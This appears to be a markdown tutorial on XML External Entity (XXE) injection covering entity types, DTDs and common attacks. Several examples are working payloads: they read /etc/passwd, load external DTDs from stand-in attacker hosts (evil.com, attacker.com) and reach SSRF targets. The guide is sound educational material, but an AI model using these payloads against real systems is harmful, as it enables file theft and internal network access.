# XML External Entity (XXE) Injection Guide

> Based on sources:  
> - [HackTricks – XXE](https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity)
> - [PortSwigger Academy – XXE](https://portswigger.net/web-security/xxe)
> - [InfoSec Writeups – XXE From Zero to Hero](https://infosecwriteups.com/xxe-from-zero-to-hero-b38118750556)

---

## 🧠 What is XXE?

**XML External Entity Injection (XXE)** is a web vulnerability that allows an attacker to interfere with the processing of XML data by an application. It can result in:

- Reading local files from the server
- SSRF (Server-Side Request Forgery) attacks
- DoS (Denial of Service)
- Data exfiltration
- Remote Code Execution in rare cases

---

## 📄 What is XML?

**XML (Extensible Markup Language)** is a markup language similar to HTML but:

- XML does **not have predefined tags** — we can define our own.
- Every tag **must be properly closed** (unlike HTML).

Example (invalid in XML, valid in HTML):
```html
<h1>Title  <!-- Missing closing tag -->
````

In XML, the above must be written as:

```xml
<h1>Title</h1>
```

---

## 🔧 Entities in XML

XML supports entities, which act like variables storing data. They are defined in the DTD (Document Type Definition) and referenced using:

```xml
&entityName;
```

For example:

![image](https://github.com/user-attachments/assets/2368a0c0-7c80-4460-afaa-5fa92376ea4d)


Here, 

**&add1;** will be replaced by `15, G Street, Chennai, India`

**&add2;** will be replaced by `25, C Street, Bangalore, India`

---

## 🧩 What is a Local Entity?

A **local entity** is an entity declared directly in the internal DTD. It contains a hardcoded value.

### Example:

![image](https://github.com/user-attachments/assets/7013f449-333b-4e91-b5cf-2d763a6034b2)


### Response:

![image](https://github.com/user-attachments/assets/470f5f47-7712-4760-98a6-42325bb5d4a5)


---

## 🌍 What is an External Entity?

An **external entity** loads content from an external URI — either a remote server or the file system.

### Example:

![image](https://github.com/user-attachments/assets/8b0fcce5-acb8-4e60-b44d-c8b094c8d084)


Response:
If the server is vulnerable and parses this XML, the contents of `/etc/passwd` will be inserted into the response.

![image](https://github.com/user-attachments/assets/5f38bac7-6f2c-4cbe-b55e-0ea96c4ec3d8)

---

## 🧾 DTD (Document Type Definition)

The **DTD** defines the structure, tags, and entities allowed in an XML document. It can be:

* **Internal**: Defined within the document
* **External**: Loaded from a URI using the `SYSTEM` keyword
* **Hybrid**: Combination of both

### Example: External DTD loading a local file

```xml
<!DOCTYPE data [
  <!ENTITY ext SYSTEM "file:///etc/passwd">
]>
<info>&ext;</info>
```

### Example: External DTD loading remote data

```xml
<!DOCTYPE data [
  <!ENTITY ext SYSTEM "http://evil.com/malicious.dtd">
]>
<info>&ext;</info>
```

---

## ⚔️ Common Exploits

* Read server files:
  `file:///etc/passwd`, `file:///c:/windows/win.ini`
* SSRF:
  `http://localhost:8000/admin`
* Blind XXE with OOB exfiltration:
  Trigger DNS or HTTP request to attacker-controlled server

---

## 🧾 All XML Entity Types with Symbols

| Entity Type                   | Declaration Syntax                                       | Usage Symbol / Call        | Description                                                           |
| ----------------------------- | -------------------------------------------------------- | -------------------------- | --------------------------------------------------------------------- |
| **Internal Entity**           | `<!ENTITY name "value">`                                 | `&name;`                   | Stores simple static data locally in the DTD.                         |
| **External Entity**           | `<!ENTITY name SYSTEM "URI">`                            | `&name;`                   | Fetches content from external file or URL (e.g., file:///etc/passwd). |
| **Parameter Entity**          | `<!ENTITY % name SYSTEM "URI">`                          | `%name;` (within DTD only) | Used **inside DTD** only. Useful for **Blind XXE**, nested DTDs.      |
| **Predefined Entity**         | *(Built-in)*                                             | `&lt;`, `&gt;`, `&amp;`    | Escapes characters like `<`, `>`, `&`, `"`, `'`.                      |
| **Numeric Entity**            | *(Built-in)*                                             | `&#x20;`, `&#65;`          | Represents characters by ASCII/Unicode code points.                   |
| **General Entity**            | *(Category)*                                             | `&name;`                   | Refers to both internal and external entities.                        |
| **External Parameter Entity** | `<!ENTITY % name SYSTEM "http://attacker.com/file.dtd">` | `%name;`                   | Declares remote parameter entity for advanced chaining.               |

---

## 🔣 Summary of Symbols

| Symbol     | Meaning / Usage                   | Where Used         |
| ---------- | --------------------------------- | ------------------ |
| `<!ENTITY` | Starts entity declaration         | DTD                |
| `SYSTEM`   | Loads entity from a URI           | DTD                |
| `%`        | Indicates a **parameter entity**  | DTD (not XML body) |
| `&name;`   | Calls a **general entity**        | In XML data        |
| `%name;`   | Calls a **parameter entity**      | Inside DTD only    |
| `&#...;`   | Numeric (ASCII or Unicode) entity | In XML body        |

---

## 🧪 Examples

### 📄 Internal Entity

```xml
<!DOCTYPE foo [
  <!ENTITY msg "Hello, World!">
]>
<note>&msg;</note>
```

---

### 📂 External Entity

```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data>&xxe;</data>
```

---

### 🧬 Parameter Entity (Advanced XXE)

```xml
<!DOCTYPE foo [
  <!ENTITY % payload SYSTEM "http://attacker.com/payload.dtd">
  %payload;
]>
```

---

### 🔒 Predefined Entities

| Character | Entity   |
| --------- | -------- |
| `<`       | `&lt;`   |
| `>`       | `&gt;`   |
| `&`       | `&amp;`  |
| `"`       | `&quot;` |
| `'`       | `&apos;` |

---

### 🔢 Numeric Entities

| Entity   | Character |
| -------- | --------- |
| `&#x41;` | A         |
| `&#65;`  | A         |
| `&#x2F;` | `/`       |

---


## 📚 References

* 📖 [HackTricks – XXE](https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity)
* 🧑‍💻 [InfoSec Writeups – XXE From Zero to Hero](https://infosecwriteups.com/xxe-from-zero-to-hero-b38118750556)
* 📖 [PortSwigger Academy – XXE](https://portswigger.net/web-security/xxe)
* 🔒 [OWASP XXE Guide](https://owasp.org/www-community/vulnerabilities/XML_External_Entity_%28XXE%29_Processing)

---

